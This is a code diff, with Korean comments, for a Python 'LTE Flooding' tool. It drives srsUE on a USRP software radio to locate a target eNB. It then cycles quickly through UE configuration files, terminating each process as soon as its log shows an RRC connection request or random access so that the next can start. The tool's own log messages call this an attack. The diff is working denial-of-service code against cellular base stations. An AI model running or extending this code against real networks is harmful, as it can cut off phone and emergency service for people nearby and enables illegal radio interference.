@@ -368,6 +368,61 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
                     config_files.append(os.path.join(config_dir, file))
         return sorted(config_files)
     
+    def get_usrp_args_from_config(self, config_path: str) -> str:
+        """config 파일에서 device_args 읽어오기"""
+        try:
+            with open(config_path, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if line.startswith('device_args'):
+                        # device_args = serial=34C78E4 형식
+                        if '=' in line:
+                            value = line.split('=', 1)[1].strip()
+                            return value
+        except:
+            pass
+        # 읽지 못하면 기본값 반환
+        return self.usrp_args
+    
+    def get_config_values(self, config_path: str) -> dict:
+        """config 파일에서 모든 설정 값 읽어오기"""
+        values = {
+            'usrp_args': None,
+            'mcc': None,
+            'mnc': None,
+            'earfcn': None
+        }
+        try:
+            with open(config_path, 'r') as f:
+                for line in f:
+                    line = line.strip()
+                    if not line or line.startswith('#'):
+                        continue
+                    if '=' in line:
+                        key, value = line.split('=', 1)
+                        key = key.strip()
+                        value = value.strip()
+                        if key == 'device_args':
+                            values['usrp_args'] = value
+                        elif key == 'mcc':
+                            try:
+                                values['mcc'] = int(value)
+                            except:
+                                pass
+                        elif key == 'mnc':
+                            try:
+                                values['mnc'] = int(value)
+                            except:
+                                pass
+                        elif key == 'dl_earfcn':
+                            try:
+                                values['earfcn'] = int(value)
+                            except:
+                                pass
+        except:
+            pass
+        return values
+    
     def run_srsue_with_config(self, config_path: str, log_file: str = None) -> subprocess.Popen:
         """단일 config 파일로 srsue 실행"""
         if log_file is None:
@@ -392,10 +447,24 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
         return subprocess.Popen(cmd, **kwargs)
     
     def run_flooding_with_configs(self):
-        """ue_configs 폴더의 모든 config 파일로 동시에 실행"""
-        # 먼저 하나의 srsue로 eNB 찾기
+        """ue_configs 폴더의 모든 config 파일로 순차적으로 빠르게 실행 (하나의 USRP 사용)"""
+        # ue_configs 폴더에서 config 파일 가져오기
+        config_files = self.get_config_files()
+        if not config_files:
+            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
+            return
+        
+        # 첫 번째 config 파일에서 시리얼 번호 읽어오기
+        usrp_args_from_config = self.get_usrp_args_from_config(config_files[0])
+        logger.info(f"Config 파일에서 USRP 인자 읽음: {usrp_args_from_config}")
+        
+        # 먼저 하나의 srsue로 eNB 찾기 (config 파일의 시리얼 사용)
         logger.info("eNB 탐색 중...")
+        # 임시로 config 파일의 시리얼을 사용하여 스카우트 config 생성
+        original_usrp_args = self.usrp_args
+        self.usrp_args = usrp_args_from_config
         scout_config = self.create_ue_config(0)
+        self.usrp_args = original_usrp_args  # 원래 값 복원
         scout_log = "/tmp/srsue_scout.log"
         scout_process = self.run_srsue_with_config(scout_config, scout_log)
         
@@ -428,7 +497,7 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
                     
                     if cell_found:
                         enb_found = True
-                        logger.info("✓ eNB를 찾았습니다! 모든 config 파일로 동시에 공격 시작...")
+                        logger.info("✓ eNB를 찾았습니다! 모든 config 파일로 순차 공격 시작...")
                         break
                 except:
                     pass
@@ -463,52 +532,82 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
             logger.error("ue_configs 폴더에 config 파일이 없습니다!")
             return
         
-        logger.info(f"{len(config_files)}개의 config 파일로 동시에 공격 시작...")
+        logger.info(f"{len(config_files)}개의 config 파일로 순차 공격 시작 (하나의 USRP 사용)...")
         
-        # 모든 config 파일로 동시에 실행
-        all_processes = []
-        for config_path in config_files:
-            try:
-                log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
-                process = self.run_srsue_with_config(config_path, log_file)
-                all_processes.append({
-                    'process': process,
-                    'config': config_path,
-                    'log': log_file
-                })
-                self.processes.append(process)
-                # 약간의 지연 (USRP 충돌 방지)
-                time.sleep(0.01)
-            except Exception as e:
-                logger.error(f"Config 파일 {config_path} 실행 오류: {e}")
+        # 모든 config 파일을 순차적으로 빠르게 실행
+        config_index = 0
+        current_process = None
         
-        logger.info(f"✓ {len(all_processes)}개의 srsue 프로세스가 실행 중입니다.")
-        
-        # 모든 프로세스가 종료될 때까지 대기
         try:
             while self.running:
-                # 종료된 프로세스 확인
-                for proc_data in all_processes[:]:
-                    if proc_data['process'].poll() is not None:
-                        # 프로세스가 종료됨 - 재시작
-                        logger.debug(f"프로세스 종료됨: {proc_data['config']}, 재시작...")
+                # 현재 프로세스가 없거나 종료되었으면 다음 config 실행
+                if current_process is None or current_process.poll() is not None:
+                    # 이전 프로세스가 있으면 정리
+                    if current_process and current_process.poll() is None:
                         try:
-                            old_process = proc_data['process']
-                            new_process = self.run_srsue_with_config(proc_data['config'], proc_data['log'])
-                            proc_data['process'] = new_process
-                            # processes 리스트 업데이트
-                            if old_process in self.processes:
-                                idx = self.processes.index(old_process)
-                                self.processes[idx] = new_process
-                            else:
-                                self.processes.append(new_process)
-                            time.sleep(0.01)
-                        except Exception as e:
-                            logger.error(f"재시작 오류: {e}")
+                            current_process.terminate()
+                            current_process.wait(timeout=1)
+                        except:
+                            current_process.kill()
+                    
+                    # 다음 config 파일로 실행
+                    if config_index >= len(config_files):
+                        # 모든 config를 다 사용했으면 처음부터 다시
+                        config_index = 0
+                    
+                    config_path = config_files[config_index]
+                    log_file = f"/tmp/srsue_{os.path.basename(config_path)}.log"
+                    
+                    try:
+                        current_process = self.run_srsue_with_config(config_path, log_file)
+                        config_index += 1
+                        logger.debug(f"Config 실행: {os.path.basename(config_path)} ({config_index}/{len(config_files)})")
+                    except Exception as e:
+                        logger.error(f"Config 파일 {config_path} 실행 오류: {e}")
+                        config_index += 1
+                        continue
                 
-                time.sleep(1)
+                # 연결 요청을 보냈는지 확인 (RRC connection request 등)
+                if current_process and os.path.exists(log_file):
+                    try:
+                        with open(log_file, 'r', encoding='utf-8', errors='ignore') as f:
+                            log_content = f.read()
+                        
+                        # 연결 요청을 보냈는지 확인
+                        request_sent = any(keyword in log_content.lower() for keyword in [
+                            'rrc connection request',
+                            'random access',
+                            'rach',
+                            'attach request'
+                        ])
+                        
+                        if request_sent:
+                            # 연결 요청을 보냈으면 즉시 종료하고 다음 config로
+                            if current_process.poll() is None:
+                                current_process.terminate()
+                                try:
+                                    current_process.wait(timeout=0.5)
+                                except:
+                                    current_process.kill()
+                            current_process = None
+                            # 다음 config로 즉시 이동 (기다리지 않음)
+                            continue
+                    except:
+                        pass
+                
+                # 짧은 대기 후 다시 확인
+                time.sleep(0.1)
+                
         except KeyboardInterrupt:
             pass
+        finally:
+            # 정리
+            if current_process and current_process.poll() is None:
+                try:
+                    current_process.terminate()
+                    current_process.wait(timeout=1)
+                except:
+                    current_process.kill()
     
     def run_flooding(self):
         """srsUE 실행 (연결 성공 시 즉시 종료하여 빠른 재연결, 매번 다른 IMSI/IMEI)"""
@@ -846,12 +945,45 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
             logger.warning("이미 실행 중입니다.")
             return
         
+        self.running = True
+        
+        # config 파일 모드 사용 여부 확인
+        if self.use_configs:
+            # config 파일에서 모든 설정 읽어서 사용
+            config_files = self.get_config_files()
+            if config_files:
+                config_values = self.get_config_values(config_files[0])
+                usrp_args_from_config = config_values['usrp_args'] or self.usrp_args
+                
+                # 로그 출력용
+                target_info = []
+                if config_values['earfcn'] is not None:
+                    target_info.append(f"주파수: EARFCN {config_values['earfcn']}")
+                if config_values['mcc'] is not None:
+                    target_info.append(f"MCC: {config_values['mcc']}")
+                if config_values['mnc'] is not None:
+                    target_info.append(f"MNC: {config_values['mnc']}")
+                target_str = ", ".join(target_info) if target_info else "기본 설정"
+                logger.info(f"Config 파일에서 설정 읽음: {target_str}")
+                logger.info(f"Config 파일에서 USRP 인자 사용: {usrp_args_from_config}")
+                
+                # USRP 연결 확인을 위해 임시로 업데이트
+                original_usrp_args = self.usrp_args
+                self.usrp_args = usrp_args_from_config
+                if not self.check_usrp_connection():
+                    self.usrp_args = original_usrp_args
+                    logger.error("USRP 장치 연결을 확인할 수 없습니다. 프로그램을 종료합니다.")
+                    raise RuntimeError("USRP 장치 연결 실패")
+                self.usrp_args = original_usrp_args  # 원래 값 복원 (실제 실행은 config 파일 사용)
+            self.run_flooding_with_configs()
+            return
+        
+        # 일반 모드: 명령어 인자 사용
         # USRP 장치 연결 확인
         if not self.check_usrp_connection():
             logger.error("USRP 장치 연결을 확인할 수 없습니다. 프로그램을 종료합니다.")
             raise RuntimeError("USRP 장치 연결 실패")
         
-        self.running = True
         target_info = []
         if self.earfcn is not None:
             target_info.append(f"주파수: EARFCN {self.earfcn}")
@@ -863,10 +995,7 @@ nas_filename = /tmp/srsue_{unique_id}_nas.pcap
         target_str = ", ".join(target_info) if target_info else "기본 설정"
         logger.info(f"LTE Flooding 시작: 인스턴스 수: {self.instances}, 대상: {target_str}")
         
-        # config 파일 모드 사용 여부 확인
-        if self.use_configs:
-            self.run_flooding_with_configs()
-        elif self.instances > 1:
+        if self.instances > 1:
             self.run_multiple_instances()
         else:
             # 단일 프로세스로 실행 (매번 다른 IMSI/IMEI 사용)
